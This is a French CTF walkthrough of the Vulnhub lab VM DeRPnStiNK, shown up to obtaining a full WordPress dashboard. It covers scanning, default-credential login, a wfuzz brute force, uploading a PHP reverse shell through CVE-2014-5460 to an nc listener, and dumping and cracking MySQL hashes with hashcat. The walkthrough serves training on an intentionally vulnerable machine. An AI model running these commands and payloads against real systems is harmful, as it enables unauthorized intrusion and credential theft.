#DeRPnStiNK
==========
##Created Saturday 07 April 2018

###Note VM DeRPnStiNK vulnhub.com :
####Difficulty: 
Beginner

####Description:
Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...

####Instructions:
This is a boot2root Ubuntu based virtual machine. It was tested on VMware Fusion and VMware Workstation12 using DHCP settings for its network interface. It was designed to model some of the earlier machines I encountered during my OSCP labs also with a few minor curve-balls but nothing too fancy. Stick to your classic hacking methodology and enumerate all the things!
Your goal is to remotely attack the VM and find all 4 flags eventually leading you to full root access. Don't forget to #tryharder

####Example:
<pre>
flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier.
</pre>

####Contact :
Hit me up if you enjoy this VM! Twitter: @securekomodo Email: [hackerbryan@protonmail.com](mailto:hackerbryan@protonmail.com)

==========================
>
Bon les flags je m'en moque, ce que je veut c'est être root sur cette machine, c'est mon seul objectif, après si je tombe sur un flag tant mieux.
Petit rappel quelque soit le pentest, il y a toujours 5 phases :
- Enumération
- Scanning
- Exploitation
- Maintien des accès
- Rapport (ethical hacking) ou nettoyage des traces (blackhat)  

##Phase 1 : enumération, attention c'est une VM on va pas y passer des heures non plus.
Pour cette phase et dans un cas réel on utilise tous les outils dont on dispose pour faire une véritable investigation du site, des adresse IP des traces sur internets des liens, des réseaux sociaux, etc. Pour cela :
- nslookup
- traceroute
- whois
- ReconNG
- Golismero
- The Harvester
- Google dork
- Shodan
- Censys
- Robtex
- host
- dig
- dnsrecon
- dnsenum
- ping 
- nmap
- snmp
- spiderfoot


###Je lance un scan pour trouver la machine sur le réseau de mon lab :
```console
root@DebSec : ~/Documents/Challenge/VulnHub # netdiscover -r 10.0.1.0/24
 Currently scanning: 10.0.1.0/24   |   Screen View: Unique Hosts                                                                                    
 1 Captured ARP Req/Rep packets, from 1 hosts.   Total size: 240                                                                                    
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 Ltd.                                                                      
 10.0.1.181      08:00:27:58:4a:9e      1      60  PCS Systemtechnik GmbH                                                                        
```

La machine cible est 10.0.1.181.

####Un scan nmap :
```console
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# nmap -sV -A --script=default 10.0.1.181 -oN DeRPnStiNK.nmap.txt

Starting Nmap 7.60 ( <https://nmap.org> ) at 2018-04-07 15:36 CEST
Nmap scan report for derpnstink.local (10.0.1.181)
Host is up (0.0047s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (EdDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 08:00:27:58:4A:9E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   4.66 ms derpnstink.local (10.0.1.181)

OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 12.55 seconds
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# 
```

####Découverte des dossiers du site :
```console
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u <http://10.0.1.181>

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : <http://10.0.1.181/>
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/weblog (Status: 301)
/php (Status: 301)
/css (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/temporary (Status: 301)
=====================================================
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# 
```


#### Allons sur l'interface du site. 
Voir que weblog ouvre une page sur l'url : <http://derpnstink.local/weblog/> , donc ajouté dans son [/etc/hosts](file:///etc/hosts) l'IP vers le domaine, relancer la page qui affiche un beau WP.

####Donc un scan Wpscan :
```console
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# wpscan -u <http://derpnstink.local/weblog/> --enumerate
_______________________________________________________________
__          _______   _____                  
\ \        / /  __ \ / ____|                 
 \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
  \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
   \  /\  /  | |     ____) | (__| (_| | | | |
\/  \/   |_|    |_____/ \___|\__,_|_| |_|

WordPress Security Scanner by the WPScan Team 
   Version 2.9.3
  Sponsored by Sucuri - <https://sucuri.net>
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]y
[i] Updating the Database ...
[i] Update completed.
[+] URL: <http://derpnstink.local/weblog/>
[+] Started: Sat Apr  7 15:42:15 2018

[!] The WordPress '<http://derpnstink.local/weblog/readme.html>' file exists exposing a version number
[+] Interesting header: LINK: <<http://derpnstink.local/weblog/wp-json/>>; rel="<https://api.w.org/>"
[+] Interesting header: LINK: <<http://derpnstink.local/weblog/>>; rel=shortlink
[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.22
[+] XML-RPC Interface available under: <http://derpnstink.local/weblog/xmlrpc.php>

[+] WordPress version 4.6.11 (Released on 2018-04-03) identified from meta generator, links opml
[!] 3 vulnerabilities identified from the version number

[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
Reference: <https://wpvulndb.com/vulnerabilities/9053>
Reference: <https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/>
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
Reference: <https://wpvulndb.com/vulnerabilities/9054>
Reference: <https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/>
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
Reference: <https://wpvulndb.com/vulnerabilities/9055>
Reference: <https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/>
[i] Fixed in: 4.9.5

[+] WordPress theme in use: twentysixteen - v1.3

[+] Name: twentysixteen - v1.3
 |  Last updated: 2017-11-16T00:00:00.000Z
 |  Location: <http://derpnstink.local/weblog/wp-content/themes/twentysixteen/>
 |  Readme: <http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt>
[!] The version is out of date, the latest version is 1.4
 |  Style URL: <http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css>
 |  Theme Name: Twenty Sixteen
 |  Theme URI: <https://wordpress.org/themes/twentysixteen/>
 |  Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthe...
 |  Author: the WordPress team
 |  Author URI: <https://wordpress.org/>

[+] Enumerating installed plugins (only ones with known vulnerabilities) ...

   Time: 00:00:03 <============================================================================================> (1630 / 1630) 100.00% Time: 00:00:03

[+] We found 1 plugins:

[+] Name: slideshow-gallery - v1.4.6
 |  Last updated: 2017-07-17T09:36:00.000Z
 |  Location: <http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/>
 |  Readme: <http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt>
[!] The version is out of date, the latest version is 1.6.7.1

[!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
Reference: <https://wpvulndb.com/vulnerabilities/7532>
Reference: <http://seclists.org/bugtraq/2014/Sep/1>
Reference: <http://packetstormsecurity.com/files/131526/>
Reference: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460>
Reference: <https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload>
Reference: <https://www.exploit-db.com/exploits/34681/>
Reference: <https://www.exploit-db.com/exploits/34514/>
[i] Fixed in: 1.4.7

[!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS) 
Reference: <https://wpvulndb.com/vulnerabilities/8263>
Reference: <http://cinu.pl/research/wp-plugins/mail_5954cbf04cd033877e5415a0c6fba532.html>
Reference: <http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html>
[i] Fixed in: 1.5.3.4

[!] Title: Tribulant Slideshow Gallery <= 1.6.4 - Authenticated Cross-Site Scripting (XSS)
Reference: <https://wpvulndb.com/vulnerabilities/8786>
Reference: <https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_tribulant_slideshow_galleries_wordpress_plugin.html>
Reference: <https://plugins.trac.wordpress.org/changeset/1609730/slideshow-gallery>
[i] Fixed in: 1.6.5

[!] Title: Slideshow Gallery <= 1.6.5 - Multiple Authenticated Cross-Site Scripting (XSS)
Reference: <https://wpvulndb.com/vulnerabilities/8795>
Reference: <http://www.defensecode.com/advisories/DC-2017-01-014_WordPress_Tribulant_Slideshow_Gallery_Plugin_Advisory.pdf>
Reference: <https://packetstormsecurity.com/files/142079/DC-2017-01-014.pdf>
[i] Fixed in: 1.6.6

[+] Enumerating installed themes (only ones with known vulnerabilities) ...

   Time: 00:00:00 <==============================================================================================> (285 / 285) 100.00% Time: 00:00:00

[+] No themes found

[+] Enumerating timthumb files ...

   Time: 00:00:05 <============================================================================================> (2541 / 2541) 100.00% Time: 00:00:05

[+] No timthumb files found

[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
+----+-------------+---------------------------------+
| Id | Login       | Name                            |
+----+-------------+---------------------------------+
| 1  | unclestinky | 404 Not                         |
| 2  | admin       | admin – DeRPnStiNK Professional |
+----+-------------+---------------------------------+

[+] Finished: Sat Apr  7 15:42:39 2018
[+] Requests Done: 4857
[+] Memory used: 104.758 MB
[+] Elapsed time: 00:00:24
```

####Il y a forcement un wp-admin !!! bingo :
<http://derpnstink.local/weblog/wp-admin> avec une jolie page d'auth sans captcha bien sur !!! Et san slimite de tentative de connexions.
On test le login password par défaut ça serait top : et bien oui !!! ça marche"" admin/admin

####Pas besoin de fuzz avec wfuzz :
```console
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --sc 302 -d "log=admin&pwd=FUZZ" <http://derpnstink.local/weblog/wp-login.php>
```

#### Mais comme je l'avais lancé :
```console
********************************************************

* Wfuzz 2.2.3 - The Web Fuzzer                         *

********************************************************
Target: <HTTP://derpnstink.local/weblog/wp-login.php>
Total requests: 14344392
==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================
19819:  C=302      0 L	       0 W	      0 Ch	  "admin"
```

####Donc c'est juste pour une confirmation, lol

####Maintenant que l'on est admin du site, que pouvons-nous faire ?
Mais même avec ce login/password on ne peut rien faire, l'admin est un user lambda, pas véritablement administrateur du site. On arrive pas à l'interface complète du site.

####Avec notre wpscan on voit entre autre :
<pre>
Mais comme on aimerait un download d'un webshell ce serait pas mal.
Wscan nous remonte quand même des vulnérabilités, donc nous allons creuser dansce sens.
</pre>

```console
[!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
Reference: <https://wpvulndb.com/vulnerabilities/7532>
Reference: <http://seclists.org/bugtraq/2014/Sep/1>
Reference: <http://packetstormsecurity.com/files/131526/>
Reference: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460>
Reference: <https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload>
Reference: <https://www.exploit-db.com/exploits/34681/>
Reference: <https://www.exploit-db.com/exploits/34514/>
[i] Fixed in: 1.4.7
```

####Donc on download en raw le script python :
Reference: <https://www.exploit-db.com/exploits/34681/>

####Ensuite il nous faut le petit reverse shell qui va bien  (je suis fan et c'est LA référence) :
<http://pentestmonkey.net/tools/web-shells/php-reverse-shell>
On adpate le script avec l'IP de monposte Kali attaquante on met le port qui va bien.

####On ouvre un netcat sur la machine attaquante :
```console
nc -lvp 5678
```

####Et on lance l'exploit :
```console
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# python ./34681.py -t <http://derpnstink.local/weblog/> -f ./php-reverse-shell.php -u admin -p admin


 $$$$$$\  $$\ $$\       $$\                     $$$$  __$$\ $$ |\__|      $$ |                    $$ |
$$ /  \__|$$ |$$\  $$$$$$$ | $$$$$$\   $$$$$$$\ $$$$$$$\   $$$$$$\  $$\  $$\  $$\$$$$$$\  $$ |$$ |$$  __$$ |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ $$ | $$ | $$ |
 \____$$\ $$ |$$ |$$ /  $$ |$$$$$$$$ |\$$$$$$\  $$ |  $$ |$$ /  $$ |$$ | $$ | $$ |
$$\   $$ |$$ |$$ |$$ |  $$ |$$   ____| \____$$\ $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |
\$$$$$$  |$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$$$$$$  |$$ |  $$ |\$$$$$$  |\$$$$$\$$$$  |
 \______/ \__|\__| \_______| \_______|\_______/ \__|  \__| \______/  \_____\____/



 $$$$$$\            $$\ $$\                                       $$\ $$\   $$\     $$$$$$            $$  __$$\           $$ |$$ |                                    $$$$ |$$ |  $$ |   $$  __$$            $$ /  \__| $$$$$$\  $$ |$$ | $$$$$$\   $$$$$$\  $$\   $$\       \_$$ |$$ |  $$ |   $$ /  \__|
$$ |$$$$\  \____$$\ $$ |$$ |$$  __$$\ $$  __$$\ $$ |  $$ |        $$ |$$$$$$$$ |   $$$$$$$            $$ |\_$$ | $$$$$$$ |$$ |$$ |$$$$$$$$ |$$ |  \__|$$ |  $$ |        $$ |\_____$$ |   $$  __$$            $$ |  $$ |$$  __$$ |$$ |$$ |$$   ____|$$ |      $$ |  $$ |        $$ |      $$ |   $$ /  $$ |
\$$$$$$  |\$$$$$$$ |$$ |$$ |\$$$$$$$\ $$ |      \$$$$$$$ |      $$$$$$\ $$\ $$ |$$\ $$$$$$  |
 \______/  \_______|\__|\__| \_______|\__|       \____$$ |      \______|\__|\__|\__|\______/
$$\   $$ |
\$$$$$$  |
 \______/

   W0rdpr3ss Sl1d3sh04w G4ll3ry 1.4.6 Sh3ll Upl04d Vuln.

  =============================================
  - Release date: 2014-08-28
  - Discovered by: Jesus Ramirez Pichardo
  - CVE: 2014-5460
  =============================================

  Written by:

Claudio Viviani

 <http://www.homelab.it>

[info@homelab.it](mailto:info@homelab.it)
 [homelabit@protonmail.ch](mailto:homelabit@protonmail.ch)

<https://www.facebook.com/homelabit>
<https://twitter.com/homelabit>
<https://plus.google.com/+HomelabIt1/>
  <https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww>

[+] Username & password ACCEPTED!

[!] Shell Uploaded!
[+] Check url: <http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/./php-reverse-shell.php> (lowercase!!!!)
```

####On apelle la page web !
<http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/./php-reverse-shell.php>

####Et bim un shell :
```console
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# nc -lvp 5678
listening on [any] 5678 ...
connect to [10.0.1.28] from derpnstink.local [10.0.1.181] 48514
Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 13:50:42 up  9:01,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

####Encore un tips merci gotmilk :
```console
python -c 'import pty; pty.spawn("/bin/bash")'
```

####Et on obtient un promt complet :
```console
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@DeRPnStiNK:/$ 
```
####Qu'avons nous comme dossier :
```console
www-data@DeRPnStiNK:/$ ls -l
ls -l
total 96
drwxr-xr-x   2 root   root    4096 Nov 11 21:02 bin
drwxr-xr-x   3 root   root    4096 Nov 11 21:02 boot
drwxrwxr-x   2 root   root    4096 Nov 11 21:01 cdrom
drwxr-xr-x  17 root   root    4100 Apr  7 06:49 dev
drwxr-xr-x 135 root   root   12288 Apr  7 04:50 etc
drwxr-xr-x   4 root   root    4096 Nov 12 12:54 home
lrwxrwxrwx   1 root   root      32 Nov 11 21:02 initrd.img -> boot/initrd.img-4.4.0-31-generic
drwxr-xr-x  23 root   root    4096 Nov 11 21:02 lib
drwx------   2 root   root   16384 Nov 11 20:58 lost+found
drwxr-xr-x   2 root   root    4096 Aug  3  2016 media
drwxr-xr-x   2 root   root    4096 Apr 10  2014 mnt
drwxr-xr-x   2 root   root    4096 Aug  3  2016 opt
dr-xr-xr-x 222 root   root       0 Apr  7 04:49 proc
drwx------  14 root   root    4096 Jan  9 12:23 root
drwxr-xr-x  26 root   root     840 Apr  7 05:00 run
drwxr-xr-x   2 root   root   12288 Nov 11 21:08 sbin
drwxr-xr-x   3 root   root    4096 Nov 12 09:02 srv
drwxr-xr-x   2 mrderp mrderp  4096 Nov 12 13:40 support
dr-xr-xr-x  13 root   root       0 Apr  7 14:03 sys
drwxrwxrwt   4 root   root    4096 Apr  7 14:04 tmp
drwxr-xr-x  10 root   root    4096 Aug  3  2016 usr
drwxr-xr-x  14 root   root    4096 Nov 11 21:12 var
lrwxrwxrwx   1 root   root      29 Nov 11 21:02 vmlinuz -> boot/vmlinuz-4.4.0-31-generic
```

####Tiens tiens le dossier "support" m'attire (lol) :
```console
www-data@DeRPnStiNK:/$ ls -l support
ls -l support
total 4
-rw-rw-r-- 1 mrderp mrderp 822 Nov 12 13:38 troubleshooting.txt
```

####Que contient ce fichier :
```console
www-data@DeRPnStiNK:/$ cat support/troubleshooting.txt
cat support/troubleshooting.txt
*******************************************************************
On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.

However i dont want to specify each command to allow

How can I exclude these commands from password protection to sudo?

********************************************************************



********************************************************************
Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket. 

Please contact the Client Support team at <https://pastebin.com/RzK9WfGw> if you have any further questions or issues.

Thank you for using our product.

********************************************************************
```

####On ouvre le lien pastebin :
<https://pastebin.com/RzK9WfGw>

#### Il contient :
```console
mrderp ALL=(ALL) [/home/mrderp/binaries/derpy*](file:///home/mrderp/binaries/derpy*)
```

#### On teste des commandes telle que sudo -l, pas mieux : rabbit home, pas vraiment, mais en tout cas on est un peu décontenancer.
Bon je pense qu'il faut bien sur utiliser le sudo de ce user mais come on est www-data, c pas gagné donc on continue.
Pause on cherche quoi on est qui ?
On cherche à faire un privilège escalation, on est ww-data, donc on va creuser.
Allons dans le dossier du site, c 'est un wp, il y a forcément des fuites (lol).
```console
www-data@DeRPnStiNK:/home$ cd /var/www/html/weblog
cd /var/www/html/weblog
www-data@DeRPnStiNK:/var/www/html/weblog$ ls
ls
index.php	 wp-blog-header.php    wp-cron.php	  wp-mail.php
license.txt	 wp-comments-post.php  wp-includes	  wp-settings.php
readme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.php
wp-admin	 wp-content	       wp-login.php	  xmlrpc.php
www-data@DeRPnStiNK:/var/www/html/weblog$ ls -l
ls -l
total 188
-rw-r--r--  1 www-data nogroup   418 Sep 24  2013 index.php
-rw-r--r--  1 www-data nogroup 19935 Apr  7 08:02 license.txt
-rw-r--r--  1 www-data nogroup  7322 Dec 12 13:39 readme.html
-rw-r--r--  1 www-data nogroup  5456 May 24  2016 wp-activate.php
drwxr-xr-x  9 www-data nogroup  4096 Aug 16  2016 wp-admin
-rw-r--r--  1 www-data nogroup   364 Dec 19  2015 wp-blog-header.php
-rw-r--r--  1 www-data nogroup  1477 May 23  2016 wp-comments-post.php
-rw-r--r--  1 www-data nogroup  2853 Dec 16  2015 wp-config-sample.php
-rw-r--r--  1 www-data root     3123 Nov 11 21:35 wp-config.php
drwxr-xr-x  6 www-data nogroup  4096 Nov 12 22:44 wp-content
-rw-r--r--  1 www-data nogroup  3286 May 24  2015 wp-cron.php
drwxr-xr-x 17 www-data nogroup 12288 Aug 16  2016 wp-includes
-rw-r--r--  1 www-data nogroup  2382 May 23  2016 wp-links-opml.php
-rw-r--r--  1 www-data nogroup  3353 Apr 14  2016 wp-load.php
-rw-r--r--  1 www-data nogroup 34067 Apr  7 08:02 wp-login.php
-rw-r--r--  1 www-data nogroup  7993 Dec 12 13:39 wp-mail.php
-rw-r--r--  1 www-data nogroup 13920 Aug 13  2016 wp-settings.php
-rw-r--r--  1 www-data nogroup 29890 May 24  2016 wp-signup.php
-rw-r--r--  1 www-data nogroup  4035 Nov 30  2014 wp-trackback.php
-rw-r--r--  1 www-data nogroup  3064 Jul  6  2016 xmlrpc.php
```

####Dans ce dossier il y a le fichier wp-config.php qui contient des informations :
```console
define('DB_NAME', 'wordpress');
wp-config.php

:
/** MySQL database username */
:
define('DB_USER', 'root');
:

:
/** MySQL database password */
:
define('DB_PASSWORD', 'mysql');
:
```
####On se connecte soit au mysql via l'authentification root/mysql.
####Trois éléments : la BDD : wordpress, le user : root, le password : mysql.
Donc on va tenter de se logguer, presque trop facile, si jamais ça marche avec du bol on aura d'autre user/password :
```console
mysql> select User, Password from user;
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| debian-sys-maint | *B95758C76129F85E0D68CF79F38B66F156804E93 |
| unclestinky      | *9B776AFB479B31E8047026F1185E952DD1E530CB |
| phpmyadmin       | *4ACFE3202A5FF5CF467898FC58AAB1D615029441 |
+------------------+-------------------------------------------+
7 rows in set (0.00 sec)
```

#####On va créer un fichier de hashes.txt avec les hash de unclestinky et phpmyadmin :
<pre>
9B776AFB479B31E8047026F1185E952DD1E530CB
4ACFE3202A5FF5CF467898FC58AAB1D615029441
</pre>

####On peut cracker ces hashes avec hashcat :
Si jamais hashcat ne marche pas dans la VM kali :
<pre>
```console
apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev
```
And
```console
apt-get install pocl-opencl-icd
```
</pre>
source ici : <https://security.stackexchange.com/questions/147397/hashcat-with-kali-2-in-a-vm#147407>
```console
root@DebSec:~/Documents/Challenge/VulnHub/DeRPnStiNK# hashcat -a 0 -m 300 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v4.0.1) starting...

VMware: No 3D enabled (0, Success).
clGetDeviceIDs(): CL_DEVICE_NOT_FOUND

clGetDeviceIDs(): CL_DEVICE_NOT_FOUND

OpenCL Platform #1: The pocl project
====================================

* Device #1: pthread-Intel(R) Core(TM) i3-2310M CPU @ 2.10GHz, 1024/3700 MB allocatable, 4MCU


OpenCL Platform #2: Mesa, skipped or no OpenCL compatible devices found.

Hashes: 4 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:

* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt


Password length minimum: 0
Password length maximum: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastical reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.


* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=2 -D DGST_R0=3 -D DGST_R1=4 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=5 -D KERN_TYPE=300 -D _unroll'
* Device #1: Kernel m00300_a0.82e7f0cb.kernel not found in cache! Building may take a while...

Dictionary cache built:

* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 8 secs


- Device #1: autotuned kernel-accel to 1024               
- Device #1: autotuned kernel-loops to 1
4acfe3202a5ff5cf467898fc58aab1d615029441:admin            [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => 
9b776afb479b31e8047026f1185e952dd1e530cb:wedgie57         
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: MySQL4.1/MySQL5
Hash.Target......: hashes.txt
Time.Started.....: Sun Apr  8 00:05:01 2018 (12 secs)
Time.Estimated...: Sun Apr  8 00:05:13 2018 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  1158.9 kH/s (2.22ms)
Recovered........: 2/4 (50.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
HWMon.Dev.#1.....: N/A

Started: Sun Apr  8 00:04:38 2018
Stopped: Sun Apr  8 00:05:14 2018
```

####On va maintenant retourner sur le site on s'authentifie avec la page wp-login mais cette fois avec le user : unclestinky et le password : wedgie57
Cool ça avance cette fois on est bien ave un user qui possède un dashborad complet !!!!

A suivre
